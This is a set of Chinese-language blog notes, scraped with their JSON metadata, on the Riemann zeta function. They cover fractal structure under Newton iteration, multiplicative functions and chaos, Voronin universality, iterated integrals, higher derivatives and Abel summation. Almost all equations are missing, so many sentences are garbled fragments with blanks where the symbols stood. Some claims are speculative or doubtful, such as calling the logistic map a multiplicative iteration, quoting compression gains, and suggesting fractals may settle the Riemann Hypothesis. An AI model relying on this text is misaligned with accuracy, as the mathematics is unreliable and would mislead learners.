3：证明自相似性与无限尺度重复不同 的唯一性：对 ， ，因为 与 的半径不同，而 与 的半径固定为 ，故平移参数 T 必须唯一区分不同尺度的映射。 嵌套结构：当 时，随 增大， 半径增大，但其映射像 保持固定尺度；当 时，初始 较小，最终仍会超过 尺度。无论哪种情况，中心区域 （最小圆盘）的结构会通过不同 的 在更小尺度上重复出现。方向与旋转的扩展：通过引入旋转因子 或共轭映射 ，可证明自相似性在任意方向和旋转下依然成立，强化了分形的各向同性。 分形性的直观理解与推论非严格递归的分形特征 函数的分形性不同于传统的确定性分形（如曼德博集合），它不通过显式迭代生成，而是通过无限多平移副本的统计自相似实现。这种结构避免了因严格递归导致的不可微性， 函数在全平面（除 外）仍保持无限可微。 三个关键推论 分形性（核心结论）：通过尺度变换映射 ， 函数在复平面不同区域（由 确定）重复自身结构，满足分形的自相似定义。 普适图像库：选取 为描绘特定轮廓（如米老鼠图案）的解析函数，由沃罗宁定理可知，存在 使得 逼近该轮廓，故 函数包含所有可能的解析曲线。 信息编码：将曲线替换为携带摩尔斯电码或文本信息的振荡函数，可证明 函数能编码任意有限信息，且在不同尺度下无限重复，成为 \"定理巨著\" 的具体实现。 结论：作为数学宇宙缩影的 ζ 函数黎曼 函数的分形性不仅是解析数论的深刻结果，更揭示了数学对象中隐藏的普遍性与复杂性。通过沃罗宁定理， 函数将素数分布、解析延拓与分形几何编织为一体：它既是研究素数规律的工具，也是一个包含所有可能解析模式的 “数学宇宙”。这种统一性引发思考：是否所有深刻的数学对象都蕴含类似的普适结构？ 函数的分形本质，或许正是数学内在和谐的终极体现。 RIEMANN ' S ZETA FUNCTION AND NEWTON ' S METHOD : NUMERICAL EXPERIMENTS FROM A COMPLEX - DYNAMICAL VIEWPOINT 黎曼 ζ 函数的分形特征：从复动力系统视角的解析黎曼 函数（ ）作为数论与分析学的核心对象，其零点分布不仅关系到素数定理的精确形式，更通过复动力系统的透镜展现出惊人的分形结构。当我们将牛顿迭代法应用于 ζ 函数及其相关变换时，迭代轨道的收敛边界，朱利亚集（Julia set），呈现出典型的自相似性与非整数维数，这为理解 ζ 函数的复杂性质提供了全新的几何视角。这里将从历史背景出发，系统构建 函数分形特征的数学基础，推导关键动力学方程，并通过数值实验揭示其与黎曼假设（Riemann Hypothesis）的深刻联系。 历史脉络：从素数分布到复动力学1859 年， Bernhard Riemann 在开创性论文《论小于给定数值的素数个数》中引入了 函数的解析延拓，将其定义域从实部大于 的半平面扩展到整个复平面（除 处的单极点外），并提出了关于非平凡零点均位于临界线 的著名猜想。这一猜想若成立，将推导出素数间隔的最优估计 ，远优于目前已知的 结果。一个半世纪以来，数学家们发展了多种研究 函数零点的工具，包括 Hardy-Littlewood 圆法、筛法及函数论方法，但零点分布的内在几何结构长期处于探索边缘。 20 世纪初，Fatou 与 Julia 建立的复动力系统理论为研究迭代映射的长期行为提供了框架。1980 年代后，计算机技术的发展使得可视化高维复函数的动力学行为成为可能。2000 年后，Aimo Hinkkanen、Dierk Schleicher 等学者开始将牛顿迭代法应用于 函数，发现其牛顿映射的朱利亚集呈现出复杂的分形图案。这些结构不仅具有美学价值，更通过 \"不动点无区域 = 零点无区域\" 的桥梁，将分形几何与黎曼假设的证明路径联系起来，这正是 2005 年 Kawahira 提出的 \"动力黎曼假设\" 的核心思想。 数学基础：ζ 函数与牛顿映射的分形机制ζ 函数的解析延拓与零点分布黎曼 函数的定义始于欧拉乘积： 通过解析延拓，该函数在复平面 上亚纯，其非平凡零点（即不位于负偶数 的零点）全部落在临界带 内。已知存在常数 ，使得区域 内无零点，其中 。这一零点无区域的宽度直接影响素数分布估计的精度，而分形方法将为拓展此类区域提供新工具。 牛顿映射的动力学框架对于亚纯函数 ，其牛顿映射定义为： 该映射的关键性质在于： 当且仅当 （即 为 的不动点）。对于简单零点 ，有 ，此时迭代序列 以平方收敛速率逼近 ；对于多重零点， ，收敛速率降为线性。这种局部收敛行为在全局迭代中演变为复杂的分形结构 —— 朱利亚集，即 Fatou 集（迭代正则区域）的补集，其特征是轨道对初始条件的敏感依赖性。 ζ 函数牛顿映射的分形特征将牛顿映射应用于 函数时，直接处理 会因 函数的极点和本性奇点带来计算困难。因此，学者们转而研究其正则化形式： η 函数： ，消除 处的极点，变为整函数 ξ 函数（黎曼 函数）： ，满足对称性 ，且零点与 函数非平凡零点完全一致 对应的牛顿映射分别为： 数值实验表明， 的朱利亚集呈现 \"鸡头\" 状的自相似结构，随着虚部增大，零点密度增加但分形特征保持不变；而 因对称性呈现分层结构，每层动力学行为与单位圆盘上的 映射共形等价。这些结构的分形维数可通过盒计数法或关联维数估计，为 函数零点的分布密度提供几何度量。 关键推导：从动力学方程到分形判据不动点稳定性与零点无区域考虑临界带 内的区域 ，若牛顿映射 ，则 在 内无零点。这一拓扑性质将零点分布问题转化为动力学迭代的区域映射问题。对 而言，其关于 的对称性意味着：若 是 的不动点，则 亦是不动点。因此，若能证明所有不动点均位于 ，则黎曼假设得证，这正是 Kawahira 提出的动力黎曼假设：广义 ν 函数在临界带内的所有不动点均位于临界线上。 分形维数的解析表达对于朱利亚集 ，其 Hausdorff 维数 可通过共形测度理论估计。对于多项式映射 ，朱利亚集的维数满足 。类似地，对 的数值模拟显示其朱利亚集具有自相似层次结构，每层的分支数按指数增长，暗示维数 。这种非整数维数反映了零点分布的疏密变化 —— 当虚部 增大时， 函数零点间距按 减小，对应分形结构的局部放大呈现相似图案。 数值实验与几何洞察三种牛顿映射的分形对比Kawahira 的数值实验揭示了三种映射的显著差异： ν(z)：因 函数的本质奇点，迭代易发散至无穷，朱利亚集边界模糊 μ(z)：呈现 \"鸡头\" 状结构，头部区域对应零点聚集区，颈部为零点间的过渡带，且随着 增大，\"鸡头\" 周期性出现但细节各异 λ(z)：对称性使朱利亚集呈现层状结构，每层可能对应临界线上的一组零点，其动力学行为可简化为单位圆盘上的二次映射，便于理论分析 这些结构不仅验证了分形的存在性，更提供了零点分布的可视化工具 —— 通过分析朱利亚集的分支点，可定位高虚部零点的近似位置。 分形与黎曼假设的关联动力黎曼假设将零点分布问题转化为不动点的对称性分析。若 的朱利亚集关于 对称且所有吸引域均以临界线上的点为中心，则黎曼假设成立。数值上，对前 个非平凡零点的计算支持这一对称性，但严格证明需要建立： 在临界带内的所有不动点均为吸引不动点 吸引域边界（朱利亚集）的测度为零 非对称初始点生成的轨道最终逃逸至临界线 这些问题的解决可能需要结合 Teichmüller 理论与分形几何的新方法。 结论与展望黎曼 函数的分形特征不仅是理论美学的体现，更是连接数论与动力系统的桥梁。通过牛顿映射构建的动力学框架，我们看到： 函数的零点分布问题等价于分形集合的对称性分析，而朱利亚集的维数与结构编码了素数分布的深层规律。未来研究可沿三个方向推进： 发展 \"分形零点计数函数\"，通过 Hausdorff 测度量化零点密度 利用机器学习识别 朱利亚集的对称破缺，寻找反例或提供黎曼假设的数值证据 将动力黎曼假设推广至 Dirichlet L 函数，探索更广泛数论对象的分形共性 复动力学为 函数研究带来了 \"全新视角\"，而分形几何或许正是解开黎曼假设之谜的最后一块拼图。当我们凝视那些由迭代方程生成的蜿蜒边界时，看到的不仅是数学的美，更是素数在复平面上留下的永恒足迹。"},{"title":"","date":"2025-10-08T08:30:00.000Z","updated":"2025-10-08T08:45:00.000Z","comments":true,"path":"notes/Zeta/40.html","permalink":"https://blog.mhuig.top/notes/Zeta/40","excerpt":"","text":"积性函数蕴含迭代结构 积性函数蕴含迭代结构 什么样的函数能够满足 ？ 首先我们想到的是幂函数。 证明满足 的抽象函数 f 是幂函数 两边同时取对数： 由于 , 因此 使得: 令 : 因为 : 因此 令 : 使用柯西方法可以证明: 因为 , 因此: 两边同时取自然指数: 这是一个幂函数的形式. 除了幂函数还有什么？存在 满足: ,满足 , . 下面定义 ： , where , , where , . 很容易知道 根本不像幂函数, 并且对于任意实数 , , 满足 . 满足 的映射 在数论中被称为积性函数，数论中有很多函数是积性函数，比如欧拉函数，莫比乌斯函数，最大公约数 等等. 例如 : gcd 满足积性条件 : 与 的最大公约数乘以 与 的最大公约数，其结果必定等于 乘以 与 的最大公约数。 可以看出，欧几里得辗转相除法求最大公约数确实具有类似于阶乘的递归迭代结构。 幂函数也可以被视为一种递归迭代结构。 推测：满足条件 的 函数必然包含一种递归迭代结构。 证明满足条件 的 函数包含递归迭代结构 可以推导出 和 的迭代式，结论表明确实存在一种递归迭代的结构。 而迭代能够产生混沌。 积性条件 是广义欧拉乘积公式的前提条件，也许黎曼 Zeta 函数是一个非线性动力学系统。 积性函数迭代与混沌的涌现积性函数的迭代结构不仅存在于幂函数中，更在非线性系统中展现出通往混沌的路径。从 这一迭代式出发，我们发现当指数 取特定值时，系统会呈现出从有序到混沌的相变过程。以最简单的幂函数 （其中 ）为例，其迭代形式可简化为： 当 时，该迭代退化为 ，表现出稳定的收敛行为；而当 增大至某一临界值后，迭代轨迹开始出现倍周期分岔，最终进入混沌区域。这种现象与非线性迭代函数系统（NIFS）的动力学特性高度吻合，简单的代数规则通过反复迭代，能够生成具有复杂分形结构的吸引子。 李 - 约克定理与周期三点的关键作用判断积性函数迭代是否进入混沌的数学依据，源自李天岩与约克在 1975 年提出的著名定理。该定理指出：若连续函数 （ 为区间）存在周期为 的点，则对任意正整数 , 存在周期为 的点，且系统中存在不可数的混沌点集。这一结论为我们提供了辨识混沌的简便判据：只需验证迭代过程中是否出现 \"三点周期\" 现象，即是否存在 使得 , , （或其循环排列）。 对于积性函数的迭代系统，周期三点的存在往往与参数取值密切相关。以广义幂函数 （其中 为非线性柯西方程解）为例，当 包含非线性扰动项时，系统会突破传统幂函数的有序性。构造对称映射 （其中 ）就展示了这种机制，随着参数 的增大，系统先经历倍周期分岔，随后通过 \"对称增加分歧\" 形成具有旋转对称性的混沌吸引子。这种吸引子既保留了积性函数的代数结构，又通过迭代演化出分形几何特征，完美诠释了 \"有序中的无序\" 这一混沌本质。 数论积性函数的隐藏混沌在数论领域，传统积性函数如欧拉函数 、莫比乌斯函数 等，其迭代行为长期被认为是收敛或周期的。然而最新研究表明，某些数论积性函数的迭代系统中同样存在混沌迹象。考虑定义在正整数集上的函数 ，其中 表示 的不同素因子个数。该函数满足弱积性条件 其迭代序列 在初始值 时表现出类似混沌的敏感依赖性 —— 将 改为 5 或 7，迭代轨迹会迅速发散至完全不同的路径。 这种数论系统的 \"伪混沌\" 行为，与连续系统中的混沌既有相似也有本质区别。相似之处在于两者都对初始条件具有敏感依赖性；差异则体现在数论系统的离散性使其无法形成连续的奇怪吸引子。但即使在离散迭代函数系统中，仍可构造测度为 的混沌集，使得系统在统计意义上呈现混沌特性。这一发现为密码学中的伪随机数生成提供了新思路，利用数论积性函数的迭代混沌性，可以设计出兼具安全性与高效性的加密算法。 从理论到应用：积性混沌的现代价值积性函数迭代系统的混沌特性，正在多个领域展现出实用价值。在图像处理领域，基于对称非线性迭代函数系统（SNIFS）的分形压缩算法，通过模拟积性函数的迭代过程，能将图像数据压缩比提升至传统方法的 3-5 倍。这类算法的核心在于利用混沌吸引子的自相似结构，用少量迭代参数替代大量像素数据，其数学本质正是积性函数 所蕴含的尺度不变性。 更引人注目的应用出现在人工智能领域。2020 年出现的在线算法作曲工具 ChaosTao，正是通过 logistic 映射（一种特殊的非线性积性迭代）生成混沌序列，再将其映射为音乐旋律。当控制参数 时，系统进入完全混沌状态，生成的音乐片段既具有局部有序的节奏特征，又在整体结构上呈现不可预测的变化，这恰是积性函数迭代中 \"确定性随机性\" 的艺术表达。 积性函数与混沌理论的交叉，不仅揭示了数学结构的深刻统一性，更暗示着自然界中有序与无序的内在联系。从素数分布的数论奥秘，到股票市场的复杂波动，积性迭代的混沌机制或许是理解这些现象的关键钥匙。当我们在非线性系统中引入对称性时，得到的不是简单的规则重复，而是有序与无序的完美融合，这正是宇宙创造复杂性的基本法则。"},{"title":"","date":"2025-10-08T22:40:00.000Z","updated":"2025-10-08T22:50:00.000Z","comments":true,"path":"notes/Zeta/42.html","permalink":"https://blog.mhuig.top/notes/Zeta/42","excerpt":"","text":"沃罗宁定理 沃罗宁定理 沃罗宁定理：黎曼 ζ 函数的普适性与解析数论革命1975 年，苏联数学家谢尔盖・沃罗宁（Sergei M. Voronin）发表了一项震惊的发现：黎曼 函数在临界带 内具有普适性，它的纵向平移 可以任意精度逼近该区域内任何非零解析函数。这一结果彻底改变了人们对 函数值分布的理解，将一个看似专为素数分布研究设计的函数，与复分析中最深刻的逼近理论联系起来。 历史背景与理论突破从 Fekete 到 Voronin：普适性概念的演化普适性思想的数学根源可追溯至 1914 年 Fekete 的工作，他构造了一个幂级数 ，能够逼近 上任何满足 的连续函数。这一纯函数论结果在六十年后意外地与数论产生交集 —— 沃罗宁发现，黎曼 函数作为数论核心对象，竟表现出同样的普适特征。 黎曼 ζ 函数的意外转折黎曼 函数 （ ）的解析延拓长期被认为是研究素数分布的工具，其非平凡零点与素数定理的误差项密切相关。沃罗宁的突破在于证明：在临界带 内， 函数的纵向平移 （其中 固定， 为实参数）构成的函数族，在紧集上的一致拓扑中稠密。这意味着 函数不仅编码素数信息，更包含了几乎所有解析函数的 \"影子\"。 定理的严格表述与数学基础经典沃罗宁定理定义（沃罗宁普适性定理, 1975）：设 ， 是非零连续函数且在内部解析。对任意 ，存在 使得 且满足该条件的 的勒贝格测度满足 关键限制条件： 非零性： 不能取零值，否则由 Rouché 定理可推出 函数在 有过多零点，与零点密度定理矛盾。 区域限制： 确保逼近区域位于临界带内部，避开可能的奇异性。 测度正性：逼近参数 的集合不仅存在，且在大区间上具有正密度。 Bagchi 的概率诠释（1981）Bagchi 将沃罗宁定理置于概率论框架下，揭示了其深刻的随机过程本质：当 时，随机变量族 （其中 在 上均匀分布）依分布收敛到一个随机欧拉乘积： 其中 是独立的单位圆上均匀分布随机变量。这一收敛发生在解析函数空间的弱拓扑中，且极限过程的支撑集包含所有满足定理条件的函数 。该结果将 函数的普适性归结为素数生成的随机序列 的遍历性质。 证明框架与核心技术从特征函数到联合分布现代证明依赖于傅里叶分析与矩估计的结合，关键步骤包括： 极大模原理简化：只需在圆盘边界 上控制逼近误差，内部估计由极大模原理自动成立。 导数估计：控制 的增长性，确保局部扰动不破坏整体逼近。核心引理表明：对 ， 其中 多变量矩匹配：对紧集上有限个点 ，证明 的联合矩收敛到随机模型 的联合矩。通过 Dirichlet 多项式逼近与素数定理的误差估计，可证对 ，有 傅里叶逆变换：通过特征函数的一致收敛性，将矩收敛转化为分布收敛，最终由紧性论证得到普适性。 有效版本与收敛速率2016 年，Lamzouri-Lester-Radziwill 首次证明了有效普适性定理，给出收敛速率的明确估计：对带权积分 其误差项为 。这一结果超越了早期 Good-Garunkštis 的定性估计，为计算数论提供了理论基础。 推广与拓展区域与函数类的扩展一般紧集：定理可推广到临界带内任何余集连通的紧集 （即 连通）。 L- 函数族：对 自守形式的 L- 函数、Dirichlet L- 函数等，类似普适性成立，只需满足 Ramanujan 猜想（系数模估计）和零点密度估计。 联合普适性：多个 L- 函数的平移可同时逼近多个解析函数，如 与 的联合逼近。 绝对收敛轴上的普适性（Andersson, 2020）经典定理限于临界带内部，而 Andersson 证明：在绝对收敛轴 上，通过尺度变换与常数项修正，普适性仍可能成立。其定理表明：对任何紧集 与解析函数 ，存在 ，使得对 和 ，有 这一结果突破了临界带限制，揭示普适性可能是 Dirichlet 级数的一般性质。 高维与自守形式的推广Hashimoto 将普适性理论推广到塞尔伯格 ζ 函数，证明对算术群的塞尔伯格 函数，在适当区域内也存在联合普适性。这表明普适性可能是具有欧拉乘积的 L- 函数的共有特征，而非 函数独有。 当代研究与未解决问题收敛速率的精确阶有效普适性定理给出的对数速率是否最优？现有结果表明 型速率可能无法改进，但确切指数仍未知。Lamzouri 等猜测最优速率可能与 有关，但缺乏严格证明。 零点集的普适性经典定理要求被逼近函数非零，自然问题是：是否存在某种意义下的 “零点普适性”？即能否逼近具有指定零点的解析函数？目前仅知道这与 函数的水平分布猜想密切相关，若假设零点均匀分布，则可能存在弱形式的零点普适性。 随机模型的精细性质Bagchi 的随机 函数 是否具有绝对连续性？这一问题等价于其最大值函数 是否无跳跃间断点。现有结果仅能证明矩收敛，但分布的连续性仍是公开问题。 结语：普适性的哲学意义沃罗宁定理揭示了一个深刻悖论：专门设计用于计数素数的黎曼 函数，却包含了几乎所有解析函数的信息。这种 “特殊性中的普遍性” 挑战了我们对数学对象分类的直觉。从 Fekete 的幂级数到 Andersson 的尺度变换普适性，这一领域的发展不断模糊数论与复分析的界限。未来，随着非交换几何、量子混沌等领域的交叉渗透，普适性可能成为连接解析数论与数学物理的新桥梁。当我们凝视公式 中参数 的变化时，看到的不仅是素数的舞蹈，更是整个解析函数世界的缩影。"},{"title":"","date":"2025-10-08T22:41:00.000Z","updated":"2025-10-08T22:51:00.000Z","comments":true,"path":"notes/Zeta/43.html","permalink":"https://blog.mhuig.top/notes/Zeta/43","excerpt":"","text":"迭代积分 迭代积分 迭代积分作为连接单变量与多变量积分的桥梁，其核心价值在于将复杂的高维积分转化为有序的低维积分序列。从牛顿时代的几何直观到勒贝格测度论的严格框架，迭代积分的发展历程折射出数学分析严格化的百年征程。柯西迭代积分公式揭示了多次积分与单重积分的深刻联系，而 Fubini-Tonelli 定理则为积分顺序交换提供了最一般的理论基础。本文将系统梳理迭代积分公式的历史脉络、数学构造、证明思路及其在现代数学中的推广应用，展现这一基础工具从经典分析到概率统计、从有限维空间到 Lie 群上积分的广泛影响。 历史演进：从无穷小量到测度论的跨越17 世纪下半叶，牛顿在 \"流数法\" 中通过将平面区域分解为无穷小矩形求和，实质上采用了先对一个变量积分再对另一个变量积分的策略，这是迭代积分思想的最早萌芽。莱布尼茨则更明确地提出了 符号作为 \"求和\" 的象征，其手稿中记载的二重积分计算已具备现代迭代积分的形式特征。 19 世纪分析严格化运动催生了迭代积分的理论突破。柯西在 1823 年《无穷小计算讲义》中首次给出二重积分的严格定义，将其表述为 \"和式的极限\"，并证明了连续函数情形下的积分顺序可交换性。黎曼 1854 年的博士论文进一步扩展了可积函数类，但直到 1902 年勒贝格引入测度概念后，迭代积分的适用范围才突破连续函数的限制，典型如狄利克雷函数在勒贝格积分意义下可积，为迭代积分奠定了更坚实的理论基础。 意大利数学家富比尼 1907 年发表的工作标志着迭代积分理论的成熟。他证明了在 σ- 有限测度空间中，只要函数满足非负或绝对可积条件，重积分与迭代积分便可以相互转化。这一成果后来与托内利的非负函数结果合并为著名的 Fubini-Tonelli 定理，成为现代分析中处理高维积分的基本工具。值得注意的是，富比尼定理中的 σ- 有限条件并非绝对必要，当 σ- 有限条件不满足时，定理对于最大乘积测度 (maximal product measure) 仍然成立。 20 世纪中叶以来，迭代积分理论向更抽象的空间结构推广。1994 年张兴汉在拟可加测度空间中建立了模糊二重积分，并证明了相应的 Fubini 定理；2019 年 Oliveira 等人将 Fubini 定理推广到指数为 的紧 Lie 群正规子群上，得到了 Haar 积分的分解公式。这些进展表明，迭代积分的核心思想 —— 通过序贯积分实现降维处理，具有超越欧氏空间的普适性。 数学定义：从矩形区域到一般可测空间经典欧氏空间的迭代积分设 为 中的矩形区域，函数 满足一定可积条件。先对 后对 的迭代积分定义为： 其中内层积分 是将 固定时关于 的偏积分，结果是关于 的一元函数，再对其在 上积分得到最终结果。类似可定义先对 后对 的迭代积分： 对于非矩形区域 迭代积分需调整为： 这种表示依赖于区域的 \"x- 型\" 分解，类似地也可进行 \"y- 型\" 分解。值得注意的是，区域的可测性并不能保证其所有切片的可测性 —— 例如 是零测集（从而可测），但其切片 若为不可测集，则 不可测。 柯西迭代积分公式当对同一函数进行多次积分时，柯西于 19 世纪给出了一个关键公式。定义 次迭代积分算子： 个积分 通过交换积分顺序，可以将其简化为单重积分表达式。以 为例： 类似地，对 情形可得： 一般地，通过数学归纳法可证明柯西迭代积分公式： 这一公式将 重积分转化为带权函数的单重积分，权重 体现了各次积分的累积效应。进一步通过 Gamma 函数 （对正整数 ），可将公式推广到分数阶积分，得到 Riemann-Liouville 积分算子： 这一推广为分数阶微积分奠定了基础。 测度论框架下的一般化在勒贝格积分理论中，迭代积分的概念被推广到抽象可测空间。设 和 是两个测度空间，乘积空间 上的可测函数 的迭代积分需满足： 截口可测性：对几乎处处的 ，截面函数 是 - 可测的；对几乎处处的 ，截面函数 是 - 可测的。 积分存在性：函数 在 上 - 可积，或 在 上 - 可积。 此时迭代积分的值与重积分相等，即： 这一结论即为 Fubini-Tonelli 定理的核心内容，其成立只需满足两个条件之一：(a) 非负可测；或 (b) 绝对可积（即 Fubini-Tonelli 定理：证明思路与条件分析定理的精确陈述Fubini-Tonelli 定理：设 和 为两个 σ- 有限的测度空间，函数 是 - 可测的。若 (a) 是非负的，即 ；或者 (b) 是可积的，即 则有： 对几乎全部的 ，切片 是 - 可测且 - 可积的；对几乎全部的 ，切片 是 - 可测且 - 可积的。 函数 是 - 可测的，函数 是 - 可测的。 迭代积分与重积分相等： 证明的关键步骤Step 1: 特征函数情形设 为可测矩形，即 其中 。此时特征函数 ，则： 由测度的可数可加性，该结论可推广到所有可测集的特征函数。 Step 2: 非负简单函数任何非负可测函数可表示为简单函数的单调极限。设 ，其中 为可测集。由积分线性性： 交换求和与积分顺序（由单调收敛定理保证）即得结论。 Step 3: 一般非负可测函数对非负可测函数 ，取简单函数列 。由单调收敛定理，两边同时取极限即证得结果。对绝对可积函数，分解为实部虚部、正部负部后分别应用非负情形的结论。 条件的必要性分析Fubini-Tonelli 定理的三个核心条件，σ- 有限性、可测性和非负 / 可积性，缺一不可： σ- 有限性：对 Tonelli 定理（非负情形）是必须的。若测度空间非 σ- 有限，即使对非负函数，三个积分也可能不相等。例如取 ， 为计数测度， 当 , 当 ，否则为 ，则两种迭代积分分别为 和 。 可积性 / 非负性：若函数不可积且非负，定理失效。经典反例是单位正方形上定义的函数 ，其两种迭代积分分别为 和 。 可测性：如前所述，函数可测不保证所有切片可测，但 Fubini 定理保证几乎所有切片可测。 高维推广与数值方法n 维欧氏空间的迭代积分Fubini 定理可直接推广到 n 维情形。对 中的矩形区域 ， 重积分可表示为 次迭代积分： 积分顺序共有 种可能，在函数满足 Fubini 条件时所有顺序给出相同结果。杨利民通过第二类 Stirling 数 得到了 Fubini 定理公式数的显式计数公式，例如 时有 种表示方法， 时有 种。 高维积分的数值挑战与对策当维度超过 时，传统网格方法面临 \"维数灾难\"—— 计算复杂度随维度呈指数增长。以 维 FPK 方程为例，采用 的网格密度时，需处理超过 万个网格点。为应对这一挑战，发展出三类主要方法： 蒙特卡洛方法：通过随机抽样近似积分，误差 ，与维度无关。基本公式为： 其中 为均匀抽样点。 重要性抽样：通过选择与 形态相近的抽样分布 ，将积分改写为 ，降低方差。Vegas 算法通过动态调整抽样密度实现自适应重要抽样，对多峰函数效率比传统方法提高 倍。 拟蒙特卡洛方法：用低差异序列代替随机序列，收敛速度可达 ，适用于中等维度问题。 Lie 群上的 Haar 积分分解在紧 Lie 群上，Haar 积分的迭代分解呈现出新的结构。设 Γ 为紧 Lie 群，Γ⁺为指数 2ⁿ的正规子群，则对任何连续函数 f:Γ→ℝ，有： 其中 为 Γ\\Γ⁺中的固定对合元。这一结果将群上积分分解为子群上积分的加权和，在 Lorentz 群等物理应用中具有重要价值。特别地，当 时退化为经典结果： 应用与前沿进展概率论中的联合分布计算设 是概率空间上的随机变量，联合密度函数为 ，则边缘密度函数可通过迭代积分计算： 特别当 独立时， ，此时期望 可由 Fubini 定理直接推出。更一般地，高维随机向量的边缘分布、条件期望等概念均依赖迭代积分理论。 分数阶微积分的数学基础柯西迭代积分公式通过 Gamma 函数推广到分数阶积分，产生了 Riemann-Liouville 积分： 这一推广为分数阶导数提供了定义框架。例如半阶积分 ，而函数 的半阶导数等于 1 的半阶积分。在物理应用中，阿贝尔积分方程： 的解可通过分数阶导数表示： 这一结果在等时降落问题中起到关键作用。 量子场论中的路径积分路径积分作为量子力学的基本工具，其数学严格化依赖高维积分理论。尽管路径积分本身不是严格的 Lebesgue 积分，但通过有限维逼近和重整化技巧，可将其表示为无限维空间上的 \"迭代积分\"。费曼 - 卡茨公式建立了路径积分与偏微分方程的联系，其核心正是将高维积分转化为含参变量的迭代积分序列。近年来，流模型 (flow model) 如 i-flow 算法通过变量替换技巧，为路径积分的数值计算提供了新途径。 理论局限与未来方向尽管迭代积分理论已发展成熟，仍存在若干开放性问题： 非 σ- 有限测度空间：对非 σ- 有限空间，Fubini 定理仅对最大乘积测度成立，但最大乘积测度的构造依赖选择公理，在构造性数学中存在争议。 奇异积分方程：如阿贝尔方程的高维推广，其解的存在性和唯一性需超越经典 Lebesgue 积分框架，可能需要借助分数阶微积分和广义函数论。 量子场论的数学基础：路径积分的严格定义仍是未解决的难题，其核心困难在于无限维空间上测度的构造，迭代积分的思想可能为这一问题提供新视角。 从牛顿的流数法到现代的分数阶积分，迭代积分公式始终是数学分析连接几何直观与严格理论的桥梁。随着数据科学和量子计算的发展，高维迭代积分的数值方法将在机器学习、量子模拟等领域发挥越来越重要的作用，而其理论基础也将在与其他数学分支的交叉中得到进一步深化。正如 Fubini 定理将二维积分分解为一维积分，未来的数学突破或许会找到将无穷维积分 \"迭代化\" 的新方法，开启分析学的新篇章。"},{"title":"","date":"2025-10-08T22:42:00.000Z","updated":"2025-10-08T22:52:00.000Z","comments":true,"path":"notes/Zeta/44.html","permalink":"https://blog.mhuig.top/notes/Zeta/44","excerpt":"","text":"高阶导数 高阶导数 历史渊源与概念演进高阶导数的思想萌芽可追溯至 17 世纪微积分建立初期。牛顿在《自然哲学的数学原理》中研究曲线曲率时，首次隐含了二阶导数的概念；莱布尼茨则通过符号体系明确表示了导数的迭代运算，其创立的 符号至今仍被广泛使用。18 世纪泰勒公式的出现（ ），使高阶导数从工具性概念升华为函数局部行为的完整描述工具，通过某点各阶导数值，多项式得以在收敛域内精确复刻原函数。 19 世纪柯西和黎曼将导数定义严格化后，高阶导数成为分析学的核心对象。20 世纪量子力学与相对论的发展进一步揭示其物理意义：在拉格朗日力学中，系统运动方程由二阶导数主导（如牛顿第二定律 ） ，而高阶时间导数会因奥斯特罗格拉茨基不稳定性导致能量无下界，这解释了为何基础物理定律极少包含三阶以上导数。 数学定义与几何意义定义：函数 的 阶导数 是对其一阶导数的 次迭代求导，即： 当 时约定 。若该极限存在，则称 在 处 阶可导。 几何与物理诠释： 二阶导数：描述函数曲率（ ）或加速度（ ）； 三阶导数：对应急动度（jerk），刻画加速度变化率，在机械工程中用于优化运动平滑性；高阶导数：在泰勒展开中决定多项式的收敛速度与震荡特性。 计算方法与技巧高阶导数的计算需结合函数特性选择策略，以下为三类典型方法： 1. 直接求导法与递推公式对初等函数可通过逐次求导寻找规律。例如 的任意阶导数均为自身； 呈现周期为 4 的循环（ ）。 例：求 在 处的 阶导数。 解：由 得 ，两边对 求 阶导数，应用莱布尼茨公式： 代入 并注意 在 时为 ，化简得递推关系： 结合初始条件 ，最终得 ， 。 2. 泰勒展开系数法利用泰勒级数唯一性，若已知 的幂级数展开式 ，则 ，即 。例如对 ，可直接读出 。 3. 微分方程转化法对隐函数或反三角函数，通过建立微分方程简化计算。如 满足 ，求导后结合莱布尼茨公式可得高阶导数递推式。 挑战与思考高阶导数的计算复杂度随阶数呈指数增长，即使对初等函数也可能不存在解析表达式。这促使数学家发展符号计算系统（如 Maple、Mathematica）和数值微分算法。 从泰勒展开的局部 - 整体关联到物理定律的导数阶数限制，高阶导数犹如数学与自然科学的交叉棱镜，既折射出函数的微观结构，也映照出宇宙运行的深层逻辑。当我们计算 时，本质上是在解码函数的 “基因序列”，而这段序列，或许早已写入宇宙诞生的初始条件。"},{"title":"","date":"2025-10-10T23:42:00.000Z","updated":"2025-10-10T23:52:00.000Z","comments":true,"path":"notes/Zeta/45.html","permalink":"https://blog.mhuig.top/notes/Zeta/45","excerpt":"","text":"阿贝尔变换 阿贝尔变换 阿贝尔变换以挪威数学家尼尔斯・亨利克・阿贝尔（Niels Henrik Abel）命名，是连接离散数学与连续分析的关键工具。它在数学分析中具有双重身份：既是离散形式的分部积分法，又是研究级数收敛性和积分变换的基础框架。这一变换的核心价值在于将乘积项的求和转化为更易处理的形式，其思想贯穿于数论、调和分析、物理学等多个领域，从素数分布的研究到等离子体物理的辐射强度分析，均可见其深刻影响。 历史背景与思想起源19 世纪初，阿贝尔在研究二项级数和椭圆函数时首次系统发展了这一变换技术。当时的数学界正处于从有限离散问题向无限连续问题过渡的关键时期，阿贝尔变换恰好提供了沟通两者的数学语言。其原始动机是解决形如 的乘积级数求和问题，这一问题在数论中的素数分布研究中尤为突出，欧拉乘积公式与黎曼 函数的分析就依赖于对乘积项求和的精细处理。 阿贝尔的核心洞察在于：离散序列的乘积求和可以通过引入部分和序列实现 \"分部\" 操作，这与微积分中的分部积分法 具有深刻的类比关系。这种离散 - 连续的对应关系后来被推广为更一般的斯蒂尔杰斯积分理论，成为现代分析的重要基石。值得注意的是，阿贝尔变换最初被称为 \"分部求和法\"（summation by parts），这一名称更直观地反映了其与分部积分的血缘关系。 数学定义与核心恒等式离散形式的严格定义设 和 是两个实数列，定义部分和序列 （约定 ），则阿贝尔变换的基本恒等式为： 这一公式的证明通过简单的代数重组即可完成：将 代入左侧求和式，得到： 重新整理第二项的求和指标（令 ），则： 提取公因式后即得到恒等式 。这一推导过程揭示了阿贝尔变换的本质：通过引入部分和序列 ，将原始求和分解为边界项与差分 - 部分和乘积的求和，这种结构与分部积分中的 完全对应。 积分形式与推广当将离散序列推广到连续函数时，阿贝尔变换演变为积分形式。设 是区间 上的连续函数， 是有界变差函数，其斯蒂尔杰斯积分形式的阿贝尔变换为： 这一结果可通过对区间进行分割 ，应用离散阿贝尔变换后取最大区间长度趋于零的极限得到。特别地，当 可微时，式 退化为标准的分部积分公式。 在物理应用中，还存在另一种重要的积分形式 —— 